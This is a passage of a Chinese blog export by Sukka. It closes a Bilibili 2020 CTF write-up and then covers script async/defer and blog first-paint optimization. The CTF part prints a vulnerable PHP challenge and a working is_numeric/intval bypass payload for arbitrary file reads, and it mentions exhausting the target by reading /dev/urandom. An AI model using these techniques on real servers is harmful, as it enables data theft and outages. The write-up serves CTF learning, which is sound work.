href=\"https://github.com/maurosoria/dirsearch\">dirsearch</a>：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/12.png\" width=\"833\" height=\"573\" class=\"lazy post-img\"></p>\n<p>直接访问 <code>/test.php</code> 是个 JSFuck，所以直接丢进 Console 就好了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/13.png\" width=\"689\" height=\"145\" class=\"lazy post-img\"></p>\n<blockquote><p>程序员最多的地方 bilibili1024havefun</p></blockquote>\n<p>程序员最多的地方当然是 GitHub 了。去 GitHub 上搜索 <code>bilibili1024havefun</code> 很容易就可以找到这个仓库 <a href=\"https://github.com/interesting-1024/end\">interesting-1024/end</a>：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><span class=\"hljs-comment\">//filename end.php</span><span class=\"hljs-variable\">$bilibili</span> = <span class=\"hljs-string\">\"bilibili1024havefun\"</span>;<span class=\"hljs-variable\">$str</span> = intval(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-variable\">$reg</span> = preg_match(<span class=\"hljs-string\">'/\\d/is'</span>, <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-keyword\">if</span>(!is_numeric(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]) <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$reg</span> !== <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$str</span> === <span class=\"hljs-number\">1</span>){    <span class=\"hljs-variable\">$content</span> = file_get_contents(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'url'</span>]);    <span class=\"hljs-comment\">//文件路径猜解</span>    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-literal\">false</span>){        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"还差一点点啦～\"</span>;    }<span class=\"hljs-keyword\">else</span>{        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$flag</span>;    }}<span class=\"hljs-keyword\">else</span>{    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"你想要的不在这儿～\"</span>;}<span class=\"hljs-meta\">?&gt;</span></code></pre>\n<p>所以这道题就是在 <code>/blog/end.php</code> 里了，构建 Payload 以获取 Flag。这道题考察的是 <code>is_numeric</code> 和 <code>intval</code> 如何绕过、以及 <code>$_GET</code> 的一些脑洞。这道题最终的 Payload 是：</p>\n<pre><code class=\"hljs plaintext\">/blog/end.php?id[]=x&amp;id[]=0.1&amp;url=./flag.txt</code></pre>\n<blockquote><p><code>url</code> 参数只要包含 <code>flag.txt</code> 即可，所以你就算 <code>url=114514flag.txt1919810</code> 都是可以的。和某些人说的 <code>/api/ctf/10/flag.txt</code>、<code>/api/ctf/6/flag.txt</code> 完全没有关系。</p></blockquote>\n<p>这道题最简洁的思路是利用 <code>$_GET</code> 支持返回数组 ：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span>print_r(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'tag_name'</span>]);<span class=\"hljs-comment\">// http://127.0.0.1/index.php?tag_name[]=苏卡卡&amp;tag_name[]=大尾巴狐狸</span><span class=\"hljs-comment\">// Array ( [0] =&gt; 苏卡卡 [1] =&gt; 大尾巴狐狸 )</span></code></pre>\n<p>关于如何 Bypass <code>is_numeric</code>、<code>intval</code>，我找到了一篇写的还挺全面的文章「<a href=\"https://hackfun.org/2018/01/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81PHP%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/\">CTF 中常见 PHP 特性学习笔记</a>」。</p>\n<blockquote><p>顺便，不少战队和选手通过 <code>$file_get_contents</code> 逃逸后，把每道题的源码都读了一遍、甚至通过读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 拖死了靶机，不过这已经是后话了。</p></blockquote>\n<h2>尾声</h2>\n<p>USTC Hackergame 2018 为了「黑曜石浏览器」的题专门上线了一个官网、在那个官网的源码中隐藏了 Heicore Browser 的 User-Agent，Bilibili 的第二题是一个非常拙劣的模仿；第三题直接就是脑筋急转弯，和渗透、社工毫无关联，密码纯粹靠猜；第四题更是表现了出题人的前端知识基本为 0，使用从 CSDN 上抄来的 URL 参数解析代码，却不知道 JavaScript 中 <code>unescape</code> 不能处理非 ASCII 字符（更不必说 <code>unescape</code> 是一个已被弃用的方法），基本上是个前端都知道宁肯引入 <code>URL.searchParams</code> 的 Polyfill 也不应该自己解析 URL；第五题并没有明确提示告诉大家应该从给定的默认 uid 开始刷（你给我翻译翻译，谁家系统的超级管理员 uid 不是小于 10 而是大于 1 亿的？）。在经过了这么多无厘头的题目以后，接下来上来就是五道 Web 盲题：未设防 Redis 题本来可以深入到 Get shell、提权的，结果第八题草草 <code>get flag8</code> 了事；第十题的「文件路径猜解」更是非常无厘头，当做题人构建完能绕过 <code>is_numeric</code> 和 <code>intval</code>  的 Payload 后，还要猜测 <code>url</code> 参数的取值需要包含 <code>flag.txt</code> 才能取到最终的 flag；而且第十题拿到的图片直接 <code>tail</code> 就能拿到 flag，而图片隐写本来是非常经典的 CTF 考法。</p>\n<p>无厘头的题目、加上混乱的活动页面（Vue 和 jQuery 齐飞、Element UI 共 Bootstrap 一色），再联想起 Bilibili 中间件源码泄漏、Anankke 在新年活动上 <a href=\"https://blog.anank.ke/w/pilipili_cheers\">只用两小时就刷出了 11 亿美食值</a>，我们大体上可以猜测的出 Bilibili 内部混乱的管理、松散的组织，和极度不重视信息安全、乃至极度不重视技术的风气。Bilibili 这一次的 CTF 暴露出来的问题，远不止选手用 <code>/blog/end.php</code> 读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 耗尽靶机性能导致题目 404 这么简单了。</p>\n<div class=\"license\">\n<div class=\"license-title\">Bilibili 2020「1024 程序员节」CTF Write Up</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-10-25</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/"},{"title":"从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性","date":"2020-10-13 09:25:00","description":"\n<p>之前我在「<a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">天下武功，唯快不破 —— 我是这样优化博客的</a>」一文中提到「对于大部分浏览器来说，确保 JS 异步加载和执行的做法其实是在操作 DOM 动态插入 <code>&lt;script async&gt;</code>」，但是并没有给出详细原因。这一次我以 Google Analytics 的统计代码为引子，详细讲讲 <code>&lt;script&gt;</code> 的 <code>async</code> 和 <code>defer</code> 属性、以及它们背后的故事。</p>\n<h2>拆开 Google Analytic 的统计代码</h2>\n<p>现在 Google 推出了 Google Tag Manager，通过 <code>window.gtag</code> 可以轻易加载包括 <code>analytics.js</code>、Google AD、Google OAuth 等 Google 插件：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Global site tag (gtag.js) - Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">\"https://www.googletagmanager.com/gtag/js?id=UA-122669675-1\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-built_in\">window</span>.dataLayer = <span class=\"hljs-built_in\">window</span>.dataLayer || [];</span><span class=\"javascript\">  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">gtag</span>(<span class=\"hljs-params\"></span>)</span>{dataLayer.push(<span class=\"hljs-built_in\">arguments</span>);}</span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'js'</span>, <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>());</span><span class=\"javascript\"></span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'config'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>在 Google Tag Manager 出现之前，大部分人更熟悉传统的 <code>analytics.js</code> 统计代码：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">i,s,o,g,r,a,m</span>)</span>{i[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>]=r;i[r]=i[r]||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{</span><span class=\"javascript\">(i[r].q=i[r].q||[]).push(<span class=\"hljs-built_in\">arguments</span>)},i[r].l=<span class=\"hljs-number\">1</span>*<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();a=s.createElement(o),</span><span class=\"javascript\">m=s.getElementsByTagName(o)[<span class=\"hljs-number\">0</span>];a.async=<span class=\"hljs-number\">1</span>;a.src=g;m.parentNode.insertBefore(a,m)</span><span class=\"javascript\">})(<span class=\"hljs-built_in\">window</span>,<span class=\"hljs-built_in\">document</span>,<span class=\"hljs-string\">'script'</span>,<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>,<span class=\"hljs-string\">'ga'</span>);</span><span class=\"javascript\"></span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 提供的代码是经过压缩后的版本。不过这段代码很短，完全不使用 debugger 等方法也可以还原出原始的代码，让我们拆拆看吧。</p>\n<p>首先不难看出这是一个 IIFE 函数，变量 <code>i</code>、<code>s</code>、<code>o</code>、<code>g</code> 和 <code>r</code>分别指的是 <code>window</code>、<code>document</code>、<code>'script'</code>、<code>https://www.google-analytics.com/analytics.js</code> 和 <code>'ga'</code>（变量 <code>a</code> 和 <code>m</code> 尚未被赋值）。让我们替换这些变量、把 IIFE 拆开：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>] = <span class=\"hljs-string\">'ga'</span>;<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] = <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] || <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{  <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q = (<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q || []).push(<span class=\"hljs-built_in\">arguments</span>)};<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].l = +<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();<span class=\"hljs-keyword\">var</span> a = <span class=\"hljs-built_in\">document</span>.createElement(<span class=\"hljs-string\">'script'</span>);a.async = <span class=\"hljs-number\">1</span>;a.src = <span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>;<span class=\"hljs-keyword\">var</span> m = <span class=\"hljs-built_in\">document</span>.getElementsByTagName(<span class=\"hljs-string\">'script'</span>)[<span class=\"hljs-number\">0</span>];m.parentNode.insertBefore(a, m);</code></pre>\n<p>这下就清楚多了。抛开 Google Analytics 的队列初始化、函数初始化的操作，<code>analytics.js</code> 本质上是通过 JS 动态创建一个 <code>&lt;script async&gt;</code> 标签、并插入到 DOM 中所有 <code>&lt;script&gt;</code> 标签之前。</p>\n<p><a href=\"https://developers.google.com/analytics/devguides/collection/analyticsjs/\">Google 关于 <code>analytics.js</code> 的文档</a> 是这么介绍的：</p>\n<blockquote>\n<p>While the Google Analytics tag described above ensures the script will be loaded and executed asynchronously on all browsers, it has the disadvantage of not allowing modern browsers to preload the script.</p>\n<p>虽然上述代码保证了脚本在所有浏览器上都会异步地加载和执行，但是它也有一个缺陷、它不能够让浏览器 preload 外部的脚本文件。</p>\n</blockquote>\n<p>Google 在文档中也给出了「现代浏览器」专用的代码，看起来和今天的 Google Tag Manager 载入代码非常接近：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\"><span class=\"hljs-built_in\">window</span>.ga=<span class=\"hljs-built_in\">window</span>.ga||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{(ga.q=ga.q||[]).push(<span class=\"hljs-built_in\">arguments</span>)};ga.l=+<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>;</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 文档也对第二种代码进行了介绍：</p>\n<blockquote>\n<p>The alternative async tag below adds support for preloading, which will provide a small performance boost on modern browsers, but can degrade to synchronous loading and execution on IE 9 and older mobile browsers that do not recognize the <code>async</code> script attribute.</p>\n<p>第二种方法在现代浏览器上会略微提升性能，因为现代浏览器支持 preloading。但是在不认识 <code>async</code> 属性的 IE9 和一些老旧的移动端浏览器上，这种方法会降级为同步加载和执行。</p>\n</blockquote>\n<p>所以，结合上述代码和 Google 文档中的描述，我们不难得出结论：</p>\n<ul>\n<li>第一种做法（由 JS 生成 <code>&lt;script async&gt;</code> 标签、动态插入 DOM 中）可以确保 <code>analytics.js</code> 被异步加载和执行，但是在现代浏览器上由于不能提前发现 <code>analytics.js</code> 、不能 preload。</li>\n<li>第二种做法在 HTML 中直接声明了 <code>&lt;script async&gt;</code>、可以被现代浏览器在 Parse HTML 阶段发现 <code>analytics.js</code> 并 preload。但是对于「并不现代的」浏览器中，这种做法不能保证 <code>analytics.js</code> 被异步加载和执行。</li>\n</ul>\n<p>那么，为什么 Google 要这么说呢？</p>\n<h2>混乱的 defer 和 async 实现</h2>\n<p>绝大部分从事前端开发的程序员应该都非常了解 <code>defer</code> 和 <code>async</code> 以及他们的区别：</p>\n<ul>\n<li>\n<code>async</code> 的加载不会阻碍 DOM 的解析，但是当加载完后就会立即执行，执行时会阻碍 DOM 的解析</li>\n<li>\n<code>defer</code> 的加载也不会阻碍 DOM 的解析，并且会在 DOM 解析完后、<code>DOMContentLoaded</code> 触发之前执行</li>\n</ul>\n<p>鲜少有人知道的是，在 HTML5 之前，异步加载和执行外部脚本有一段混乱而荒唐的历史。</p>\n<p><code>defer</code> 属性的历史可以追溯到 1999 年 12 月 24 日制定的 HTML4.01 规范。在 <a href=\"https://www.w3.org/TR/html401/interact/scripts.html#adef-defer\">规范的第 18.2 节中的 18.2.1「SCRIPT 元素」</a> 中，有对 <code>defer</code> 属性的描述：</p>\n<blockquote>\n<p>When set, this boolean attribute provides a hint to the user agent that the script is not going to generate any document content (e.g., no “document.write” in javascript) and thus, the user agent can continue parsing and rendering.</p>\n<p>该 Boolean Attribute 用于提示 User Agent 这份脚本不会生成 document 内容（如，不使用 <code>document.write</code>），因此 User Agent 在遇到该脚本时不应该暂停解析和渲染 document。</p>\n</blockquote>\n<p>值得注意的是，在 HTML4.01 规范中没有强制浏览器用什么行为面对 <code>defer</code> 属性，各个浏览器的实现导致了千奇百怪的行为，这里仅简单列举几个 Quirk 行为：</p>\n<ul>\n<li>2001 年发布的 IE 6 开始对 <code>defer</code> 属性提供支持，但是直到 11 年后 IE 10 发布之前，IE 都不能保证带有 <code>defer</code> 属性的 <code>&lt;script&gt;</code> 能够按顺序执行：如果第一个 <code>defer</code> 的 <code>&lt;script&gt;</code> 使用 DOM API 修改了 DOM 结构、那么第二个 <code>&lt;script defer&gt;</code> 会在第一个 <code>&lt;script&gt;</code> 执行完毕之前就会开始执行。</li>\n<li>2009 年发布的 Firefox 3.5 开始对 <code>defer</code> 属性提供支持，<a href=\"https://bugzilla.mozilla.org/show_bug.cgi?id=688580\">但是带有 <code>defer</code> 的 <code>&lt;script&gt;</code> 可能会在 <code>DOMContentLoaded</code> 之后加载和执行</a>，而且 Firefox 甚至会异步执行带有 <code>defer</code> 属性的内联脚本。这一行为直到五年后在 Firefox 31 中才被修复。</li>\n<li>2010 年的 Chrome 8 开始实现 <code>defer</code> 属性。但如果页面的 MIME Type 为 XHTML（<code>application/xhtml+xml</code>），那么 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=874749\">Chrome 会无视 <code>&lt;script&gt;</code> 的 <code>defer</code> 属性</a>，因为 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=611136\">在 XHTML 中 <code>defer</code> 属性只是一个可选实现</a>。</li>\n</ul>\n<p>终于在 HTML5 中，不仅 <code>defer</code> 应有的行为被正式确定下来，而且还介绍了一个新的属性 <code>async</code>，提供了「真正异步地」加载和执行外部脚本的方式。也正是因为 HTML5 正式发布，下面这张介绍 <code>defer</code> 和 <code>async</code> 区别的图也开始深入人心：</p>\n<blockquote><p>这张出现在绝大部分文章中的图，正是来自 HTML5 规范：<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async\">https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async</a></p></blockquote>\n<p>IE 10、Chrome 8、Firefox 3.6 都对 <code>async</code> 属性提供了支持。相对于 <code>defer</code> 混乱的实现，浏览器对 <code>async</code> 的实现可谓是乖巧了许多：除 Safari 5.0 会无视 <code>async</code> 的取值外（<code>async=false</code> 时仍然会异步地加载和执行该外部脚本。这一 Bug 在 Safari 5.1 即被修复），绝大部分浏览器的实现都很正常。</p>\n<h2>等等，动态插入的 script 标签呢</h2>\n<p>如果你还记得 Google 给出的第一种 <code>analytics.js</code> 的加载方法的话（什么？你不记得了？快回到第一节再看一遍），你会注意到 Google 为了「保证了脚本在所有浏览器上都会异步地加载和执行」，使用了 <code>document.createElement('script')</code> 和 <code>el.parentNode.insertBefore</code> 动态插入 <code>&lt;script&gt;</code> 标签。这就引出了这一节的内容：动态插入的 <code>&lt;script&gt;</code> 应该按照什么顺序加载和执行呢？</p>\n<p>这个问题在 HTML4.01 的规范中完全没有说明，因此 HTML5 发布之前，当时的浏览器也依然采用了自己的实现：</p>\n<ul>\n<li>对于 WebKit、Blink 和 IE，动态插入的脚本将会被默认视为需要被异步加载和执行的脚本。如果要同步执行，需要显式声明 <code>async = false</code>。</li>\n<li>对于 Presto（早期 Opera 使用的自研内核）和 Firefox &lt;= 4，动态插入的脚本会默认同步加载和执行，除非显示声明 <code>async = true</code>。不过从 Firefox 4.0 开始，动态插入的脚本将会异步加载和执行，以和 IE、WebKit 行为保持一致（因此同步执行也一样需要显式声明 <code>async = false</code> ）；当 Opera 15 开始更换为基于 Chormium 开发（当时 Chromium 版本为 28）后，行为也变得和 IE、WebKit 一致。</li>\n</ul>\n<p>在 HTML5 规范中，这一问题终于被一劳永逸的解决了。在「<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#script-processing-model\">HTML Standard - 4.12.1.1 Processing Model</a>」中明确规定了浏览器应该如何处理动态插入的 <code>&lt;script&gt;</code>。对于传统的脚本（非 Module），大致处理流程如下所示：</p>\n<blockquote><p>本图由 Sukka 绘制，按照 CC BY-NC-SA 4.0 协议共享。使用时请遵守许可协议，注明出处、不得被用于商业用途（除非获得书面许可）。</p></blockquote>\n<h2>尾声</h2>\n<p>Google Analytics 在 2013 年开始逐渐用 <code>analytics.js</code> 代替 <code>ga.js</code> 时，市面上同时存在有现代的支持 HTML5 和 <code>async</code> 属性的浏览器、和不支持 <code>async</code> 属性的「前 HTML5 时代的」古董浏览器。如果要保证在所有的浏览器上 Google Analytics 都能被异步地加载和执行，动态地将 <code>&lt;script&gt;</code> 标签插入 DOM 中、并显式声明 <code>async = true</code> 无疑是唯一的方法。随着古董浏览器逐渐退出人们的视线、实现 <code>async</code> 属性的浏览器在全球的份额已经达到了 98.08%，Google 终于开始直接用 <code>&lt;script async&gt;</code> 标签引入 Google Tag Manager。</p>\n<div class=\"license\">\n<div class=\"license-title\">从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/script-async-defer/\">https://blog.skk.moe/post/script-async-defer/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-10-13</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/script-async-defer/"},{"title":"再快一点，再快一点 —— 优化博客白屏时间的实践","date":"2020-10-03 08:40:00","description":"\n<p>两个多月以前，我写了一篇文章 <a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">介绍我是如何优化我的博客的</a>，但是我对于博客的白屏时间仍然不满意。过去一个月我在博客上进行了一系列优化实践，终于成功将博客的白屏时间减少了将近 50%，这篇文章就来记录优化的过程和方案。</p>\n<h2>确定和分析白屏时间</h2>\n<p>First Paint 和 First Contentful Paint 是衡量白屏时间的重要指标。Google Chrome 团队提供了专门的库 <code>web-vitals</code> 用于在浏览器中衡量这些指标。直接在本地开发环境中引入该库：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">\"module\"</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-keyword\">import</span> {getFCP, getLCP, getFID} <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'https://unpkg.com/web-vitals@0.2.4/dist/web-vitals.es5.min.js?module'</span>;</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Contentful Paint</span></span><span class=\"javascript\">  getFCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 Largest Contentful Paint</span></span><span class=\"javascript\">  getLCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Input Delay</span></span><span class=\"javascript\">  getFID(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>访问在本地运行的 Hexo Server 实例（<code>http://localhost:4000</code>），打开任意一篇文章，然后在 Dev Tools 中切换到「Performance」Tab 中限制 Network 和 CPU 性能：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/1.png\" width=\"1276\" height=\"279\" class=\"lazy post-img\"></p>\n<blockquote><p>进行性能测试时，模拟移动端的网络和性能是非常重要的。然而，Firefox 的 Dev Tools 至今很遗憾地没有实现这个功能（许多类似的 Feature Request 在 Bugzilla 已经 stall 数个月了）。这也是为什么我钟情于使用 Chromium Based 的浏览器开发的原因。</p></blockquote>\n<p>刷新页面，Console 中会输出三个数值（单位均为毫秒）：</p>\n<pre><code class=\"hljs plaintext\">FCP 1537.4400000000605LCP 1921.934FID 3.559999997378327</code></pre>\n<p>可以看到，First Contentful Paint 时间在 1.5 秒左右、而 Largest Contentful Paint（最大的可视元素，此时是文章的头图）是 1.9 秒。考虑到这是在本地环境、TTFB 只受模拟的「Fast 3G」限制，不难想象在实际访客体验中白屏时间绝对不止 1.5 秒。</p>\n<h2>分析性能瓶颈</h2>\n<p>肯定了问题的确存在，接下来就需要寻找性能瓶颈了。在「Performance」Tab 中将 CPU 性能修改为「6x slowdown」放大性能瓶颈，然后用「Start profiling and reload page」按钮刷新页面和获取火焰图：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/2.png\" width=\"1386\" height=\"946\" class=\"lazy post-img\"></p>\n<p>其中，Layout 占据的时间（117.43ms）比 Parse HTML（22.48ms）和 Recalculate Style（20.37ms）都要长得多，基本可以认定这就是性能瓶颈了。接下来判断是页面什么元素导致了 Layout 的性能瓶颈。对博客中其它页面进行 Profiling，并将火焰图进行对比：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/3.png\" width=\"860\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>从左往右分别是 「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」、首页、「<a href=\"https://blog.skk.moe/post/hello-world/\">Hello World</a>」页面的火焰图和 Layout 用时。</p></blockquote>\n<p>根据火焰图和三个页面的特征，猜测是文章内容部分导致了 Layout 用时过长。为了加以验证，在 CSS 中使用 <code>display: none</code> 将文章内容直接从 DOM 中离线，然后重新生成火焰图。</p>\n<blockquote><p>在页面渲染时， <code>display: none</code>  的元素会直接从 DOM 中离线、不参加 Style 和 Layout。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/4.png\" width=\"1194\" height=\"946\" class=\"lazy post-img\"></p>\n<p>将文章内容设置 <code>display: none</code> 后，Layout 性能直接提升了三倍，所以可以确认性能瓶颈就是文章内容的 Layout 了。</p>\n<h2>优化白屏时间</h2>\n<p>文章内容的 Layout 时间比较长，而文章内容在加载完之前不会触发 First Paint。所以如果需要缩短白屏时间，就必须缩短文章内容 Layout 的用时。</p>\n<p>Layout 是浏览器计算元素几何信息的过程：元素的大小、在页面中的位置。Layout 性能一般和 DOM 元素数量、布局复杂性、布局模型有关。对于 DOM 元素数量这一点没有什么好的解决方案 —— 文章就这么长、每个段落就是一个 <code>&lt;p&gt;</code> 元素；对于文章内容也没有布局复杂性或布局模型可言。因此这是一条死路。</p>\n<p>直接对着自己的博客动死脑筋是行不通的，我决定先和其他的内容网站的 Layout 性能对比一下：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/5.png\" width=\"960\" height=\"500\" class=\"lazy post-img\"></p>\n<blockquote><p>上图左一为知乎专栏文章「<a href=\"https://zhuanlan.zhihu.com/p/25800461\">PWA 在饿了么的实践经验</a>」的火焰图；左二为 QuQuBlog「<a href=\"https://imququ.com/post/optimize-tls-handshake.html\">TLS 握手优化详解</a>」的火焰图；左三为 dev.to 的「<a href=\"https://dev.to/mustapha/css-grid-illustrated-introduction-52l5\">CSS Grid: illustrated introduction</a>」的火焰图。</p></blockquote>\n<p>和其它内容网站比较发现，当页面包含较长篇幅的内容时，「CPU 6x slowdown」下 Layout 用时大抵在 100ms 到 200ms 左右。我的博客内容页面 Layout 用时在 120ms 属于正常范围、基本没有进一步优化的空间。</p>\n<p>不过，我在看 dev.to 的火焰图时发现了一个很有趣的现象：虽然完整 DOM 的 Layout 用时在 123.70ms、但是却发生在 First Paint 和 First Contentful Paint 之后。</p>\n<p><img 